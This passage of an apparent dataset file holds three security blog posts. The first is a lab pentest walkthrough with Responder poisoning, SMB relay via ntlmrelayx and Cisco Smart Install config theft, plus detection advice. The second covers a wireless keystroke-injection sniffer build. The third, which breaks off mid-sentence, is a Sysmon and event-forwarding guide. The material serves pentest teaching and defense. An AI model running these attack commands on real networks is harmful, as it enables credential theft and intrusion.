        "output": "Title: \"A Pentesters Voyage - The First Few Hours\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, Jordan Drysdale, Red Team, Jordan Drysdale\"\nCreation Date: \"Wed, 13 May 2020 12:28:00 +0000\"\nJordan Drysdale //\n\nMany methodologies have been written, but the first few hours on an internal pentest tell the story of an organization\u2019s security culture. This type of test differs from an assumed compromise or pivot in that the tester walks into the network fully armed.\n\nrequirements.txt\n\nNmap: https://nmap.org/ \n\nResponder: https://github.com/lgandx/Responder \n\nImpacket: https://github.com/SecureAuthCorp/Impacket \n\nCrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec \n\nLDAPDomainDump: https://github.com/dirkjanm/ldapdomaindump \n\nBloodHound: https://github.com/BloodHoundAD/BloodHound \n\nADExplorer: https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer \n\nOffSec\u2019s ExploitDB: https://github.com/offensive-security/exploitdb \n\nSIET: https://github.com/Sab0tag3d/SIET/ \n\ndefenses.txt\n\nMicrosoft\u2019s Baseline Audit Configuration: https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations\n\nSysmon: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\n\nSysmon-modular config: https://github.com/olafhartong/sysmon-modular\n\nKilling LLMNR: https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/ \n\nREADME.md\n\nIt is 7:15 AM local timezone. The weather is nice, and we\u2019d all rather be outside... but, we have an internal test starting this morning. The implant is calling back from the customer network and after grabbing a cup of coffee, it\u2019s time to get started. \n\nLLMNR and NBNS are almost universally the first things I check for. Within 5 or 10 minutes, the question: \u201cIs there LLMNR / mDNS / NBNS on the local network?\u201d has usually been answered. \n\npython Responder.py -I ens160 -A\n\nAt this point, we know it is game on, and that bad things are likely to happen in the next couple of days. \n\nFINDING: Network Vulnerable to LLMNR and NBNS Poisoning.\n\nChecking for SMB signing on a few local systems is also important for the SMB and NTLM relay race. Running the following Nmap scripts check will lead us in the direction we want to go. \n\nls /usr/share/nmap/scripts/ |grep smb\n\nThe next quick Nmap scan checks for known SMB ports and knocks. The polite question is \u201cdo you support SMB signing and is it kindly enforced?\u201d \n\nnmap -sU -sT -p U:137,T:139,445 --script=smb2-security-mode.nse 10.10.98.0/24\n\nFINDING: SMB Message Signing Disabled\n\nAt this point, it is about 7:55 AM, and I have gone through this process as I would on any pentest (and documented this blog as if it was a pentest). The environment in question is the \u201cApplied Purple Teaming\u201d and was designed by @krelkci and I, @rev10d, so as such, does not need redacted in any way. \n\nIt is time to check for a couple of quick hits and potentially devastating network vulnerabilities. Back to Nmap.\n\nnmap -p 4786 10.10.0.0/16 -oG smart-installs\n\nFINDING: Cisco Smart Install Client Service Available\n\nThen, we can pull the configs with SIET.\n\nsiet.py -i 10.10.10.10 -g \n\nFINDING: Cisco Type 7 Passwords In Use\n\nIt is about 8:30 AM local time at this point, and a series of findings have been produced and it is time to gear up and get serious. The LLMNR > Relay attacks have been discussed extensively here, and all over the security sphere, so I will limit the details to as little as possible. \n\nDisable SMB and HTTP responses in Responder.conf.\n\nFire up ntlmrelayx from the impacket > examples directory and revisit the list of systems that lacked SMB message signing enforcement. \n\n./ntlmrelayx.py -tf smbtargets -smb2support\n\nWith Responder running, we gain access to remote systems, dump SAM tables, and compromise boxes. With switch and router configs, we can target remote networks we had no idea existed. We have credentials at this point and can use LDAPDomainDump to gather the AD schema details. \n\nBut, we want to catch this behavior too. The following took a helping hand from a TrustedSec blog and a SIGMA rule, but we eventually came to the same conclusion. \n\nWhich SIGMA rule?\n\nhttps://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_pass_the_hash.yml\n\nIn our lab environment, we could consistently catch the pass-the-hash attacks by monitoring event_id : 4624, with logon types of ntlmssp, and the security SID at S-1-0-0 (NULL / NOBODY). You too can instrument this attack! \n\nTo catch Nmap scanning will require some modifications of your current boundary defense structures. Where VLAN boundaries exist, there are likely firewall zones or policies... some companies are pretty lax with their segmentation\u2026 However, if there are firewalls making decisions about packet forwarding between IP sources and destinations, the opportunity to implement IDS / IPS at those boundaries exist. So now, you can catch the thousands of packets sourced from a single IP address targeting your disparate network ranges. \n\nThe latest versions of Cisco IOS address the Smart Install problem. IOS now boots a client and waits a short period of time, listens for control operations, and shuts down when none are heard. \n\nSeriously, SMB message signing should be enforced. The results of not doing so can be far too catastrophic to ignore. \n\nIn the simplest of terms, these few attacks produce viable results that demonstrate the seriousness of on-by-default weak configuration. There are defenses and mitigations for all of them, including maintaining patched systems, instrumenting, segmenting networks, and adding some group policies. \n\nThanks for reading, as always. This blog was brought to you by a cooperative partnership between Defensive Origins (@defensiveOGs) and Black Hills Information Security (@bhinfosecurity).\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Promiscuous Wireless Packet Sniffer Project\"\nTaxonomies: \"Author, Fun & Games, Hardware Hacking, How-To, Informational, InfoSec 101, Ray Felch, Raymond Felch\"\nCreation Date: \"Wed, 27 May 2020 12:15:00 +0000\"\nRay Felch //\n\nIntroduction:\n\nAfter completing and documenting my recent research into keystroke injections (Executing Keyboard Injection Attacks), I was very much interested in learning the in-depth technical aspects of the tools and scripts I used (created by various authors and security research professionals). In particular, I was interested in creating my own software/hardware implementation of these exploits, rather than blindly executing and accepting the work of others.\n\nObviously, this effort required a deep-dive into the work of some very notable information security researchers such as Travis Goodspeed (GoodFet 2009), Marc Newlin (Bastille Research - MouseJack 2016), Samy Kamkar (KeySweeper 2015), Marcus Mengs / Rogan Dawes (Logitacker 2019), Darren Kitchen (Ducky Scripts - Hak5), phikshun / infamy (JackIt insecurity of Things 2017) and Thorsten Schr\u00f6der / Max Moser (KeyKeriki 2010).\n\nBy taking on the challenge in this manner, my intention was to create an 'all encompassing' well-documented account of the many aspects of HID (human interface device) exploitation, allowing others to also benefit from what I discovered along the way. \n\nResearch information:\n\nNordic Semiconductor\n\nThe vast majority of wireless (non-bluetooth) receivers used with keyboards, mice, presentation clickers, etc are based on the legacy Nordic nRF24L Series embedded hardware chips. The ESB (Enhanced Shockburst) protocol used in Nordic transceivers allow for two-way data packet communication, supporting packet buffering, packet acknowledgment, and automatic retransmission of lost packets.\n\nThe Nordic radio operates over the 2.4GHz ISM band (2.4 - 2.525GHz) using GFSK modulation, offering baud rates of 250kbps, 1Mbps or 2Mbps and typically transmits at 4dBm (yet capable of 20dBm of power).  The nRF24L01+ transceiver uses channel spacing of 1MHz, yielding 125 possible channels.\n\nNordic transceivers are capable of receiving on 6 pipes (nodes) and transmitting on 1 pipe. They are capable of receiving on all 6 pipes simultaneously, however, can only listen on one channel at a time. \n\nNote: The target's device address must be known in order to read and write data, to and from the remote device. All configuration and data transmission are handled via SPI (Serial Peripheral Interface) using FIFO (first-in, first-out) buffers.\n\nNordic's Shockburst packet protocol\n\nNotice, that the address field is defined to be 3 to 5 bytes (typically 5). \n\nPromiscuous Sniffing\n\n(http://travisgoodspeed.blogspot.com/2011/02/promiscuity-is-nrf24l01s-duty.html)\n\nInterestingly, Travis Goodspeed discovered back in 2011 that although the Nordic nRF24L transceiver chipset did not officially support packet sniffing, a pseudo-promiscuous mode existed capable of sniffing a subset of packets being transmitted by various devices. This was accomplished by ignoring Nordic's specification about the address being limited to 3 - 5 bytes.\n\nRealizing that two bits defined the address size, Travis set the address to the illegal value of zero and got a byte match. By disabling CRC (checksums) he got an influx of false-positive packets that he could then examine for authenticity by manually calculating and confirming checksums.  Obviously, without assigning a specific address to listen for, this method would yield an enormous amount of traffic, including false packets due to background noise. Later, Travis created his goodfet.nrf autotune script that significantly improved identifying MAC addresses and beacons. Travis's research extended the work of Thorsten Schr\u00f6der and Max Moser of the KeyKeriki v2.0 project (2010).\n\nNote: Although all vendors (Microsoft, Logitech, etc) using the Nordic nRF24L Series radio, followed the same ESB packet protocol specifications, how these vendors defined their specific payloads and hardware interaction varied tremendously. Some used plain text communication with no encryption. Others used encryption on their keyboard traffic but left mice plain text, etc.\n\nThorsten Schr\u00f6der and Max Moser (http://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/) built a hardware device based on an NXP LPC17 Arm Cortex-M3 microcontroller with SDR (software-defined radio) firmware. Their device employed two different Nordic radio transceiver modules. In order to successfully transmit, receive, and parse vendors packets they needed to analyze the content and attempt to find and determine any encryption (cryptographic algorithms), sequence counters being used, and find the checksum algorithm (necessary for transmission). Their KeyKeriki project was instrumental in laying the groundwork for other researchers to follow.\n\nThorsten Schr\u00f6der and Max Moser determined the header of the Microsoft Keyboard packet was plain text and the remainder of the payload was encrypted using the device address as the secret key XOR'd with the data. \n\nExample of Microsoft's keyboard encryption\n\nIn 2016, Marc Newlin (Bastille Research - Mousejack / Burning Man) https://www.bastille.net/research/vulnerabilities/mousejack/technical-details made some significant findings regarding vulnerabilities in quite a few well-known vendor devices (Microsoft, Logitech, HP, Dell, Lenovo, AmazonBasics). See: https://www.bastille.net/research/vulnerabilities/mousejack/affected-devices\n\nRelated to his research, Marc Newlin noted:  \n\n\"The Crazyflie is an open-source drone which is controlled with an amplified nRF24L based dongle called the Crazyradio PA.\" See: https://www.bitcraze.io/crazyflie-2/\n\n\"This is equivalent to an amplified version of the USB dongles commonly used with wireless mice and keyboards. Modifying the Crazyradio PA firmware to include support for pseudo-promiscuous mode made it possible to distill the packet sniffing and injection functionality to a minimal amount of Python code.\"\n\nHow is keystroke injection possible?\n\nWireless mice and keyboards communicate using proprietary protocols operating in the 2.4GHz ISM band. Unlike Bluetooth, there is no industry-accepted standard to follow, and vendors are left to implement their own security methodologies. Wireless communication between these devices is accomplished by transmitting radio frequency packets to a receiver dongle attached to a user's laptop or desktop computer. When the user presses a key (or moves/clicks their mouse), the action is transmitted to the dongle. The dongle listens for radio frequency packets being sent by these paired devices and notifies the computer as the actions occur. The dongle submits this information in the form of USB HID (Human Interface Device) packets.\n\nTo prevent eavesdropping, many vendors encrypt their keyboard's transmitted traffic. The dongle knows the encryption key being used by the keyboard and is able to decrypt the data to determine the action(s) being conveyed. Without knowledge of this key, an attacker would not have access to the plain text data or know the information being typed.\n\nMarc Newlin (Bastille Research) discovered that none of the mice tested used any encryption techniques. This means that the plain text data packets being transmitted by the mouse could be spoofed by an attacker pretending to be a mouse. Marc Newlin also discovered that due to the way some dongles process their received packets, it was actually possible to transmit specially created keystroke packets in place of mouse movements and mouse clicks. In some cases, he found that protocol weaknesses allowed an attacker to generate authentic-looking encrypted packets to the dongle.\n\nIn the course of Marc Newlin's research, it was also determined that there were keyboards and mice that communicated with no encryption whatsoever. This lack of an encryption protocol offers no security, allowing an attacker to inject malicious keystrokes, as well as sniff keystrokes being typed by the user.\n\nUsing the Crazyradio PA dongle, it's possible to sniff the wireless keyboard and mouse traffic being sent to the dongle, which is then converted to USB HID packets on the computer. These HID packets can, in turn, be sniffed by enabling the usbmon kernel module on Linux, thereby displaying the HID code of the key pressed. The captured RF packets can then be analyzed against the HID packets generated to determine vendor-specific protocols.\n\nLogitech Unifying Receivers\n\nUnifying is a proprietary protocol widely used by Logitech wireless mice and keyboards.  Logitech's main focus with the Unifying protocol was the ability to connect up to 6 compatible keyboards and mice to one computer with a single Unifying receiver \u2013 and forget the hassle of multiple USB receivers. The majority of Unifying dongles use Nordic nRF24L transceivers, with the remaining devices using Texas Instruments CC254x transceivers. All devices are compatible over-the-air regardless of the underlying hardware.\n\nThe Bastille Research Team determined that all Unifying packets use either a 5, 10, or 22 byte ESB payload length. In addition to the 2-byte CRC provided by the ESB packet, Unifying packets are also secured with a 1-byte checksum.\n\nUnifying keystroke packets are encrypted using 128-bit AES, using a key generated during the pairing process. The specific key algorithm was unknown to the team, however, they were able to demonstrate encrypted keystroke injection without knowledge of the key.\n\nThe dongles always operate in receive mode and all paired devices operate in transmit mode. A dongle can not actively transmit to a paired device, however, it does use ACK payloads to send commands to a device.\n\nChannel Hopping\n\nWhen a device is first switched on, it transmits a \"wake-up\" packet to the address of the dongle that it's paired with. This causes the dongle to begin listening on the address of the sending device. In order to quickly respond to poor channel conditions, a device sends periodic \"keep-alive\" packets to the dongle. If a \"keep-alive\" packet is missed, both the device and the dongle move to a new channel. The periodic timing interval is set by the device. Keeping the timeout interval shorter increases stability (fewer channel changes) but at the cost of high power consumption.  To better ensure reliable injections it's advisable to keep the timeout intervals shorter than the target device typically uses.\n\nPairing\n\nHost software enables pairing mode over USB. Once enabled, the dongle listens for new pairing devices on a fixed pairing address BB:0A:DC:A5:75 for a period of 30 - 60 seconds. Not all firmware on Unifying dongles can be updated, thus the need to keep the pairing process generic for backward compatibility. When a device is first switched on, it will attempt to reconnect to it's paired dongle using \"wake-up\" packets. If it cannot find it's paired dongle, it will transmit a pairing request to the fixed pairing address to initiate pairing.\n\nMousejack Device Discovery and Research Tools\n\nBastille Research provides access to some of the tools they used for their research of exploitable devices. https://github.com/BastilleResearch/mousejack In particular, I found the nRF24_scanner.py and nRF24_sniffer.py python scripts extremely helpful while conducting my own research. \n\nOther Contributors\n\nDuring my extensive research on this project, I frequently found myself following the work of other researchers and their implementations of keystroke injection techniques. In particular, I want to give a shout-out to phikshun / infamy (JackIt Insecurity of Things). In my previous blog, Executing Keyboard Injection Attacks, I reliably used JackIt to demonstrate my injection attacks to gain root access to vulnerable devices. JackIt also proved to be an invaluable debugging tool while working on my promiscuous scanner/sniffer project. JackIt combines the tools of the Bastille Research Team with the already proven Ducky Scripting language of Darren Kitchen - Hak5, into an awesome keystroke injection attack tool.\n\nMy keystroke injection research project would not be complete without also mentioning the recent work (2019) of Marcus Mengs / Rogan Dawes - Logitacker. Marcus implemented a hardware solution to accomplish discovery, passive and active enumeration, forced pairing, keystroke injection, scripting, and much more, specifically for Logitech devices. Using a Nordic nRF52840 (pca 10059) USB dongle, Marcus flashed his binary code to the dongle, complete with a convenient command-line interface (CLI).\n\nAnother major contributor to my keystroke exploitation research efforts is the work of Samy Kamkar author of KeySweeper. Although I didn't actually attempt to construct his hardware project, I did find the concept to be very interesting from a key-logging exfiltration point of view. Samy's KeySweeper wirelessly sniffs, decrypts, and logs (as well as reports using GSM) on wireless Microsoft keyboards in the vicinity. His write-up is very informative and quite easy to follow. http://samy.pl/keysweeper/\n\nBuilding an inexpensive promiscuous sniffer\n\nParts List:\n\nArduino Nano\n\nnRF24L01+ Transceiver module\n\nVoltage regulator module\n\nArduino Nano V3 module\n\nnRF24L01+ PA LNA long-range module (optional)\n\nWiring the hardware is pretty straightforward. The nRF24 radio is controlled via SPI (serial peripheral interface) and the SPI pins are clearly marked on the voltage regulator board. Initially, I breadboarded the project and later fabricated a stand-alone direct-wired version. Either method can be built rather quickly (depending on your soldering and/or breadboard experience). Also, I decided to maintain a color-code scheme throughout my hardware design work. Doing so helps reduce (if not eliminate) the potential for wiring errors.\n\nThe Arduino Nano V3 is a breadboard friendly micro-controller board based on the ATmega328. It has 22 input/output pins (14 digital and 8 analog), 32Kb flash memory, 2Kb flash bootloader, and 8Kb of SRAM. The Arduino sniffer sketch will need to be programmed into the Arduino Nano board using the Arduino IDE https://www.arduino.cc/en/Main/Software\n\nIMPORTANT NOTE: You can use the nRF24L01+ transceiver without using the voltage regulator, however, if you choose to do so, you must power the nRF24L01+ with 3.3v maximum or risk destroying the module. If you use the voltage regulator board (highly recommended), you can power it with 5v and the regulator board will safely regulate it down the 3.3v for the radio. Both 3.3v and 5v outputs are available on the Nano board.\n\nKeep in mind, transmitting requires quite a bit of power (PA max setting) and at times the Arduino Nano may have trouble delivering the required power. This can cause intermittent dropped packets, as well as limit the effective range. Using the voltage regulator board significantly improves the overall performance of the radio. The effective range with the voltage regulator board is approximately 100 meters (10 meters without). Using the optional nRF24L01+ PA LNA long-range module with external antenna has been tested and verified to reach 1100 meters (line of sight).\n\nWiring Diagram\n\nDue to my past success using JackIt for keystroke injections and my desire for a compact device capable of being attached to a mobile phone, I decided to work from Insecurity of Things' uC_mousejack (phikshun) repository. The uC_mousejack project consisted of getting 'mousejack' attacks into a small embedded device, with the form factor of a key chain.  The code provides a tool to use Duckyscript to launch automated keystroke injection attacks against Microsoft and Logitech devices. If you have no idea what Duckyscript is, see the Hak5 USB Rubber Ducky Wiki  https://github.com/hak5darren/USB-Rubber-Ducky/wiki\n\nPromiscuous Sniffer Code\n\ngit clone https://github.com/insecurityofthings/uC_mousejack\n\ncd /uC_mousejack/src\n\nmkdir promisc_sniffer\n\ncopy c:\\attack.h  promisc_sniffer\n\ncopy c:\\\\promisc_sniffer.ino promisc_sniffer\n\ncd promisc_sniffer\n\n(run) promisc_sniffer.ino\n\nPrimarily, I was interested in being able to promiscuously scan (passive-enumeration) mac addresses of potentially vulnerable devices in the vicinity and then sniff those addresses (active-enumeration) to determine packet payloads and thereby fingerprint the device as exploitable Microsoft or Logitech devices where applicable.\n\nFor this particular project, I was not concerned with the attack mode feature of uC_mousejack and intentionally disabled this function in the code. If you decide that you want to re-enable attack mode, please know that no interaction is required to initiate an attack. Be careful where you use this device. We can not accept any responsibility for how this tool is used.\n\nAlso note that I modified the code to monitor the keystroke injection being transmitted and display these packets via the serial bus. This data can be viewed using the Serial Monitor (under Tools) in the Arduino IDE or by monitoring the serial port if using platformIO. Alternatively, you can view this data in Windows-based systems with PuTTY.\n\nSample Output of a Vulnerable Microsoft Mouse 5000 (passive/active enumeration)\n\n(determined by a valid payload length (checksum verified) and fingerprinted HID Type)\n\nSample of Keystroke Injection Attack on Vulnerable Logitech K400r Keyboard (injection 'ABC')\n\nSample of Keystroke Injection Attack on Vulnerable Microsoft Mouse 5000 (injection 'ABC')\n\nObviously, this is where the fun really begins. Deciphering these proprietary packets needs to be done on a vendor by vendor basis to determine the exact protocols being used by these devices to communicate with the dongle. 'Stay-Alive' and 'wake-up' packets need to be recognized and fingerprinted, as well as inter-packet timing intervals need to be established and maintained. Marc Newlin - Bastille Research and Thorsten Schr\u00f6der / Max Moser have done an enormous amount of research in this area and their whitepapers are open-source and publicly available.\n\nConclusion\n\nAs you might have noticed, there have only been a handful of industry-leading security researchers investigating this area of wireless exploitation. And although they have been extremely successful at varying degrees, we can all agree it's next to impossible to check every keyboard and mouse out there in the wild. Obviously, some of these devices can be updated with new firmware, thereby mitigating the risk (provided they take the initiative to do so), however, there are many devices out there with OTP (one time programmable) firmware, exposing complete systems (and ultimately complete networks) to malicious attacks.\n\nThe quickest and most obvious solution would be to swap out wireless keyboards and mice with their wired counterparts in secured areas. Bluetooth devices tend to be a bit more expensive and prone to use considerably more power, however, these too would help reduce the risk of exposure.\n\nFrom an InfoSec perspective, taking the promiscuous sniffer approach and maintaining a database of known vulnerable devices and their fingerprints could go a long way in helping corporations learn of possible weaknesses in their infrastructure. Ideally, it would be beneficial to be able to go onsite, fire up a portable sniffer, capture addresses and packets, fingerprint these devices as vulnerable or safe, and ultimately print out a log of suspect devices for the customer. Just a thought.\n\nIn closing, I will say that I have learned an enormous amount of information about this often overlooked area of wireless exploitation. As more and more security concerns arise in the IoT (internet of things), it is sometimes very easy to overlook keyboards and mice as simplistic and harmless devices. Up until a couple of months ago, I surely did. Going forward, that will change.\n\nReferences\n\nGoodspeed, Travis. (February 7, 2011). Promiscuity is the nRF24L01+'s Duty. Retrieved from http://travisgoodspeed.blogspot.com/2011/02/promiscuity-is-nrf24l01s-dut\n\nNewlin, Marc. (October 24, 2015). Hacking Wireless Mice with an NES Controller. Presented at ToorCon 17, San Diego, CA\n\nBitcraze AB. (2016). Crazyflie 2.0. Retrieved from https://www.bitcraze.io/crazyflie-2/\n\nBitcraze AB. (2016). Crazyradio PA. Retrieved from https://www.bitcraze.io/crazyradio-pa/\n\nRelated Work\n\n\"KeyKeriki v2.0 \u2013 2.4GHz\", Thorsten Schr\u00f6der & Max Moser, CanSecWest 2010.\n\nhttp://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/\n\nhttps://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-1184-\n\n\"Promiscuity is the nRF24L01+'s Duty\", Travis Goodspeed, 2011.\n\nhttp://travisgoodspeed.blogspot.com/2011/02/promiscuity-is-nrf24l01s-duty.html-\n\n\"KeySweeper\", Samy Kamkar, 2015.\n\nhttp://samy.pl/keysweeper/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To Deploy Windows Optics: Commands, Downloads, Instructions, and Screenshots\"\nTaxonomies: \"Author, How-To, Informational, Jordan Drysdale, Kent Ickler, Jordan Drysdale, Kent Ickler, Windows Optics\"\nCreation Date: \"Wed, 17 Jun 2020 18:16:45 +0000\"\nJordan Drysdale & Kent Ickler //\n\nTL;DR\n\nLook for links, download them. Look for GPOs, import them. Look for screenshots, for guidance. Sysmon + Windows Audit Policies + Event Collectors and Forwarding (Handlers) + WinLogBeat + Elastic = The baseline configuration for producing endpoint optics that matter (for almost free).\n\nPART 1 - Building Your Lab Environment\n\nThere are some significant pre-recommendations for a complete follow along. Be warned, this environment will not run on your laptop. Be prepared to consume 6 CPUs, 20GB of RAM and about 120GB of disk space. It would be best to deploy a PFSense router on your virtual environment and build an isolated network behind it.\n\nPFSense VM\n\n1 vCPU, 4GB RAM, 20GB disk\n\nWAN: DHCP\n\nLAN: 10.10.98.1/24\n\nInstructions for deploying on VMWare: https://docs.netgate.com/pfsense/en/latest/virtualization/virtualizing-pfsense-with-vmware-vsphere-esxi.html\n\n.iso Download: https://www.pfsense.org/download/\n\nWindows Server 2016 - Domain Controller\n\n1 vCPU (2 is better), 4GB RAM (more is better), 32GB disk\n\n10.10.98.10/24\n\nDNS: 127.0.0.1\n\nDNS2: 1.1.1.1\n\nDeploy a domain (scripts on Github): https://github.com/DefensiveOrigins/DomainBuildScripts\n\nSkip ADDS-Step4 - and run BadBlood - for the love of everything, don't do this on your business domain.\n\nWindows 10 - Domained Workstation\n\n1 vCPU (2 is better), 4GB RAM (more is better), 32GB disk\n\nDHCP\n\nDomain joined\n\nUbuntu 18.04 - Elastic Stack and Attack Rig\n\n2 vCPUs, 8GB RAM, 32GB disk\n\n10.10.98.20/24\n\nDNS: 10.10.98.10\n\nDNS2: 1.1.1.1\n\nInstall HELK.\n\nUse the initial user account to \"git clone\" - NOT ROOT.\n\nuser# git clone https://github.com/Cyb3rWarD0g/HELK.git\n\nuser# sudo -s\n\nroot# cd HELK/docker/\n\nroot# ./helk_install.sh (will take about 15 minutes)\n\nYour lab should look approximately like this at this point. \n\nPart 2 - Sysmon\n\nDownload the Modular Repo\n\nDownload the Sysmon modular repo: https://github.com/olafhartong/sysmon-modular \n\nThis repository, once downloaded, appears as follows.  \n\nThe power of this configuration utility is the include / exclude configuration available under each of the associated Sysmon event ID containers. For example, event ID 3's container: 3_network_connection_initiated has the following file structure.  The includes and excludes define the rules which Sysmon utilizes to write events. Read the repo\u2019s notes! You probably want to exclude some things. Too much noise is not a good thing.\n\nOr, just download sysmonconfig.xml from https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml and know that Olaf is looking out for us all.  \n\nGenerate A Config File\n\nGenerate your own sysmon config from the sysmon-modular directory. Open a PowerShell window and CD in to the just downloaded and extracted repository (repo).  \n\nOnce you are comfortable with the container structure and the underlying processes, make the changes appropriate for your network. Then, perform the following command to generate your own configuration file.  \n\nInstall Commands\n\nThe following commands instantiate a PowerShell session that does not care about your Code Signing practices, accepts that change request, pulls in the code and merges your Sysmon modular directory structure\u2019s contents.\n\nSet-ExecutionPolicy bypass \nY \nimport-module .\\Merge-SysmonXml.ps1 \nMerge-AllSysmonXml -Path ( Get-ChildItem '[0-9]*\\*.xml') -AsString | Out-File sysmonconfig.xml\n\nNote, this sysmonconfig.xml file will be used during installation of Sysmon.  \n\nManual Sysmon Install\n\nThe configuration file generated earlier (sysmonconfig.xml) should be used for the install.  \n\nDownload Sysmon because we can\u2019t provide it for you: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon \n\nsysmon64.exe -accepteula -i sysmonconfig.xml \n\nRepeat this process for all lab systems. \n\nAny time you make changes to the sysmon-modular container, regenerate the configuration file using the merge-all script. You can easily update the Sysmon configuration then with the following command (run it against your new config file).  Only run the next command when you have updated the original sysmonconfig.xml.\n\nsysmon.exe -c sysmonconfig.xml \n\nGroup Policy Deployment\n\nThe SysPanda article here details the process: https://www.syspanda.com/index.php/2017/02/28/deploying-sysmon-through-gpo/ \n\nCreate a startup script that calls the sysmon-gpo.bat file, which is included in the APT-Class repos. \n\nLink the GPO wherever it belongs for installs.  \n\nPart 3 - Windows Audit Policies\n\nThe following section includes a lot of reading because the audit policies we configured in the provided GPOs may not match your desired end state. \n\nKnowledge Expansion\n\nGuidance for the Windows Audit Policy configuration (baselines) derived from: \n\nhttps://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations\n\nAnd Palantir also provides a fair amount of guidance for setting up the GPOs.  \n\nhttps://github.com/palantir/windows-event-forwarding/tree/master/group-policy-objects\n\nDeploying GPOs\n\nCreate two GPOs in the Group Policy Management console (and some time will be saved by importing the settings from provided GPOs).  \n\nEnhanced-WS-Auditing \n\nEnhanced-DC-Auditing \n\nImport settings from https://github.com/DefensiveOrigins/APT06202001/tree/master/Lab-GPOs or follow the Microsoft or Palantir guidance as described to build out your own audit policies. \n\nBrowse to your copy of the GPO backup. \n\nComplete the same process for the DC-Auditing policy. \n\nLinking GPOs to OUs\n\nThis write-up is light on background and long on technical. So, for a quick refresh, a group policy object (or GPO) contains a set of instructions for Windows objects. Linking GPOs to objects is also dependent on the structure of your organizational units (OUs). If you have a messy OU structure, this step might be a challenge to get right. However, in our lab environment, you may need to create a couple of OUs for workstations or ComputerObjects > Laptops and ComputerObjects > Workstations... so that the instruction sets can be applied appropriately. \n\nLink the Enhanced-WS-Auditing GPO to the AD OU containing the Windows 10 installation.  \n\nLink the Enhanced-DC-Auditing GPO to the AD OU called Domain Controllers. \n\nWhen complete, the simplest deployment appears as follows. \n\nPart 4: WEF / WEC / Event Channel Configuration\n\nThis is the part where we configure event forwarding instructions and fire up an event collector. The collector needs buckets for inbound logs and event subscriptions for the Windows Event Forwarding (WEF) clients.\n\nWindows Event Forwarding\n\nOpen gpmc.msc (group policy management console) on the Event Collector.\n\nCreate a new GPO called Windows Event Forwarding. Gather the objects from the following repo for import. Depending on your lab\u2019s domain naming, you may need to modify the server FQDN. The WEF GPO is located in the https://github.com/DefensiveOrigins/APT06202001/tree/master/Lab-GPOs repo. \n\nWe need to make sure Event Log Readers (built-in local group) can do its thing. \n\nConfigure (or just double check) the subscription manager URL, which is the event collector. \n\nConfiguration Check!\n\nThis policy configuration parameter is located in the GPO tree here: \n\nComputer Configuration > Policies > Administrative Templates > Windows Components > Windows Event Forwarding > Configure target Subscription Manager) \n\nThe subscription manager should be: http://YourWEC\u2019sFQDN:5985/wsman/SubscriptionManager/WEC,Refresh=60 \n\nThere seems to be a spot of confusion around using HTTP for this connection. My understanding is that the forwarded logs are still encrypted via Kerberos in transit. \n\nEnable WinRM - Required on All Systems\n\nSince all systems in the collection and forwarding process need WinRM, create and attach a GPO for this service and the firewall rule. \n\nCreate a new GPO called: Enable WinRM and Firewall Rule \n\nNavigate to Computer > Policies > Windows Components > Windows Remote Management (WinRM) > WinRM Service \n\nSet \"Allow remote server management\" to enabled. \n\nNext, Computer > Preferences > Control Panel > Services and add WinRM as shown below. \n\nNext, create the firewall rule which is located in the GPO tree below (or - we\u2019ve already done this and exported the GPO for your use). \n\nComputer Configuration > Policies > Security Settings > Windows Firewall and Advanced Security > Windows Firewall and Advanced Security \n\nAdd a Pre-Defined rule for WinRM. \n\nOr, create a new GPO called Enable WinRM and Firewall Rule and import the settings from the provided GPO by the same name.\n\nLink GPOs\n\nAttach this GPO to the domain. At this point, the following configuration is the simplest deployment possible to enable baseline audit policies, enable WinRM and tell systems where the Subscription Manager (for forwarding events) is located on the network. \n\nAll Systems: Enable WinRM and Firewall Rule \n\nWorkstations: Audit Policy and Windows Event Forwarding \n\nDomain Controllers: Audit Policy and Windows Event Forwarding \n\nWindows Event Collector / Event Channel Configuration (on the Event Collector) \n\nDownload and extract the Palantir Event Forwarding Repo: https://github.com/palantir/windows-event-forwarding \n\nAccess the Event Collector (DC in lab enviro) and from the CMD prompt, stop the wecsvc.\n\nnet stop Wecsvc\n\nDisable all WEF subscriptions manually in event viewer by unloading the current Event Channels (um = unload manifest).\n\nwevtutil um C:\\windows\\system32\\CustomEventChannels.man\n\nReplace the files listed below in C:\\Windows\\System32\\ from the repo's \"windows-event-channels\" container. Or, if they don\u2019t exist, just copy them over there.\n\nCustomEventChannels.dll  \n\nCustomEventChannels.man \n\nLoad the replacement channels. (im = import manifest)\n\nwevtutil im C:\\windows\\system32\\CustomEventChannels.man \n\nIncrease the size of the channels (log buckets) in PowerShell now! Not CMD.\n\nCMD C:\\> powershell -ep bypass \n$xml = wevtutil el | select-string -pattern \"WEC\" \n foreach ($subscription in $xml) { \n wevtutil sl $subscription /ms:4194304 \n } \n\nRestart the Event Collector service (from CMD prompt)\n\nnet start wecsvc \n\nEvent Viewer should have some new channels on the collector. You may need to restart the Windows Event Viewer service. \n\nNext, add the associated subscriptions. CD into the wef-subscriptions container in the windows-event-forwarding directory.  \n\nInstall all subscriptions with the following for loop - CMD prompt, not PowerShell!\n\nfor /r %i in (*.xml) do wecutil cs %i\n\nWith all of the appropriate GPOs linked like so: \n\nEnable WinRM: All systems \n\nDC-Auditing: DC only \n\nWS-Auditing: All workstations \n\nWindows-Event-Forwarding: All systems \n\nRun the following on both domain systems. \n\ngpupdate /force \n\nPart 5: Finally. Log Shipping with WinLogBeats\n\nDownload the Repo Because We Cannot Provide it for You.\n\nDownload the WinLogBeat config file (winlogbeat.yml) from Defensive Origins Github: 